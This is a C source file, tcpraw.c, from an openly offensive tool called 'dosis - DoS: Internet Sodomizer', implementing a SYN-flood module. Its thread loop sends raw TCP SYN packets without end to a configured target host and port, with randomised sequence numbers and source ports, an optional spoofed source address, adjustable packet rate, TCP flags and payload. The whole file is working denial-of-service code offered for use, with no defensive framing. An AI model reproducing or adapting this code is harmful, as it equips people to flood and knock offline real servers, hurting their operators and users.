/*****************************************************************************
 * tcpraw.c
 *
 * DoS on TCP servers by raw tcp packets (synflood?).
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008-2009 Gerardo García Peña <gerardo@kung-foo.dhs.org>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>

#include "dosconfig.h"
#include "dosis.h"
#include "ip.h"
#include "lnet.h"
#include "log.h"
#include "payload.h"
#include "pthreadex.h"
#include "tcpraw.h"
#include "tea.h"

typedef struct _tag_TCPRAW_CFG {
  /* options */
  INET_ADDR          shost;
  INET_ADDR          dhost;
  int                flags;

  /* parameters */
  unsigned           npackets;
  double             hitratio;
  char              *payload;
  unsigned           payload_size;

  /* other things */
  pthreadex_timer_t  timer;
  LN_CONTEXT        *lnc;
} TCPRAW_CFG;

#define ip_protocol(x) (((struct iphdr *) (x))->protocol)
#define ip_header(x)   ((struct iphdr *)  (x))
#define tcp_header(x)  ((struct tcphdr *) ((x) \
                       + (((struct iphdr *) (x))->ihl << 2)))

/*****************************************************************************
 * THREAD IMPLEMENTATION
 *****************************************************************************/

static int tcpraw__listen_check(THREAD_WORK *tw, char *msg, unsigned int size)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;

  /* check msg size and headers */
  if(size < sizeof(struct iphdr)
  || ip_protocol(msg) != 6
  || size < sizeof(struct tcphdr) + (ip_header(msg)->ihl << 2))
    return 0;

  /* check msg */
  return ip_header(msg)->saddr == tc->dhost.addr.in.addr
      && ntohs(tcp_header(msg)->source) == tc->dhost.port
         ? -255 : 0;
}

static void tcpraw__thread(THREAD_WORK *tw)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;
  unsigned int seq = libnet_get_prand(LIBNET_PRu32);
  int i;

  /* ATTACK */
  while(1)
  {
    /* wait for work */
    if(tc->hitratio > 0)
      if(pthreadex_timer_wait(&(tc->timer)) < 0)
        TERR("Error at pthreadex_timer_wait(): %s", strerror(errno));

    /* build TCP packet with payload (if requested) */
    TDBG2("Sending %d packet(s)...", tc->npackets);
    for(i = 0; i < tc->npackets; i++)
    {
      seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;
#warning "Set flags"
#warning "Set window"
      ln_send_tcp_packet(tc->lnc,
                         &tc->shost.addr.in.inaddr, libnet_get_prand(LIBNET_PRu16),
                         &tc->dhost.addr.in.inaddr, tc->dhost.port,
                         TH_SYN, 13337,
                         seq, 0,
                         (char *) tc->payload, tc->payload_size);
    }
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * CONFIGURATION. 
 *   Is important to consider that this function could be
 *   called several times during thread live: initial
 *   configuration and reconfigurations.
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int tcpraw__configure(THREAD_WORK *tw, SNODE *command)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;
  SNODE *cn;
  char *s;
  int i;

  /* first initialization (specialized work thread data) */
  if(tc == NULL)
  {
    if((tc = calloc(1, sizeof(TCPRAW_CFG))) == NULL)
      TFAT("No memory for TCPRAW_CFG.");
    tw->data = (void *) tc;

    /* initialize libnet */
    if((tc->lnc = calloc(1, sizeof(LN_CONTEXT))) == NULL)
      TFAT("No memory for LN_CONTEXT.");
    ln_init_context(tc->lnc);

    pthreadex_timer_init(&(tc->timer), 0.0);
  }

  /* read from SNODE command parameters */
  cn = command->command.thc.to->to.pattern;
  tc->npackets = 1;
  tc->hitratio = 1.0;
  switch(cn->type)
  {
    case TYPE_PERIODIC:
      tc->npackets = tea_get_int(cn->pattern.periodic.n);

    case TYPE_PERIODIC_LIGHT:
      tc->hitratio = tea_get_float(cn->pattern.periodic.ratio);
      if(tc->hitratio < 0)
        TFAT("%d: Bad hit ratio '%f'.", cn->line, tc->hitratio);
      if(tc->npackets <= 0)
        TFAT("%d: Bad number of packets '%d'.", cn->line, tc->npackets);
      break;
    default:
        TFAT("%d: Uknown pattern %d.", cn->line, cn->type);
  }

  /* read from SNODE command options */
  for(cn = command->command.thc.to->to.options; cn; cn = cn->option.next)
    switch(cn->type)
    {
      case TYPE_OPT_SRC:
        s = tea_get_string(cn->option.addr);
        if(ip_addr_parse(s, &tc->shost))
          TFAT("%d: Cannot parse source address '%s'.", cn->line, s);
        free(s);
        if(cn->option.port)
          ip_addr_set_port(&tc->shost, tea_get_int(cn->option.port));
        break;

      case TYPE_OPT_DST:
        s = tea_get_string(cn->option.addr);
        if(ip_addr_parse(s, &tc->dhost))
          TFAT("%d: Cannot parse source address '%s'.", cn->line, s);
        free(s);
        if(cn->option.port)
          ip_addr_set_port(&tc->dhost, tea_get_int(cn->option.port));
        break;

      case TYPE_OPT_FLAGS:
        s = tea_get_string(cn->option.flags);
        tc->flags = 0;
        for(i = 0; s[i]; i++)
          switch(toupper(s[i]))
          {
            case 'U': tc->flags |= 0x20; break; /* urgent */
            case 'A': tc->flags |= 0x10; break; /* ack    */
            case 'P': tc->flags |= 0x08; break; /* push   */
            case 'R': tc->flags |= 0x04; break; /* reset  */
            case 'S': tc->flags |= 0x02; break; /* syn    */
            case 'F': tc->flags |= 0x01; break; /* fin    */
            default:
              TFAT("%d: Unknown TCP flag '%c'.", cn->line, s[i]);
          }
        free(s);
        break;

      case TYPE_OPT_PAYLOAD_FILE:
      case TYPE_OPT_PAYLOAD_RANDOM:
      case TYPE_OPT_PAYLOAD_STR:
        payload_get(cn, &tc->payload, &tc->payload_size);
        break;

      default:
        TFAT("%d: Uknown option %d.", cn->line, cn->type);
    }

  /* configure timer */
  if(tc->hitratio > 0)
    pthreadex_timer_set_frequency(&(tc->timer), tc->hitratio);

  /* configure src address (if not defined) */
  if(tc->dhost.type == INET_FAMILY_NONE)
    TFAT("I need a target address.");
  if(tc->shost.type == INET_FAMILY_NONE)
  {
    DOS_ADDR_INFO *ai;
    if((ai = dos_get_interface(&tc->dhost)) == NULL)
    {
      char buff[255];
      ip_addr_snprintf(&tc->shost, sizeof(buff), buff);
      TWRN("Cannot find a suitable source address for '%s'.", buff);
    } else
      ip_addr_copy(&tc->shost, &ai->addr);
  }

  /* (debug) print configuration */
  {
    char buff[255];

    TDBG2("config.periodic.n     = %d", tc->npackets);
    TDBG2("config.periodic.ratio = %d", tc->hitratio);

    ip_addr_snprintf(&tc->shost, sizeof(buff)-1, buff);
    TDBG2("config.options.shost  = %s", buff);
    ip_addr_snprintf(&tc->dhost, sizeof(buff)-1, buff);
    TDBG2("config.options.dhost  = %s", buff);
    TDBG2("config.options.flags  = %x", tc->flags);
  }

  return 0;
}

static void tcpraw__cleanup(THREAD_WORK *tw)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;

  /* collect libnet data */
  ln_destroy_context(tc->lnc);
  free(tc->lnc);
  pthreadex_timer_destroy(&tc->timer);

  if(tc->payload)
  {
    free(tc->payload);
    tc->payload = NULL;
  }
  free(tc);
  tw->data = NULL;
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * TCPRAW TEA OBJECT
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

TEA_OBJECT teaTCPRAW = {
  .name         = "TCPRAW",
  .configure    = tcpraw__configure,
  .cleanup      = tcpraw__cleanup,
  .listen_check = tcpraw__listen_check,
  .thread       = tcpraw__thread,
};

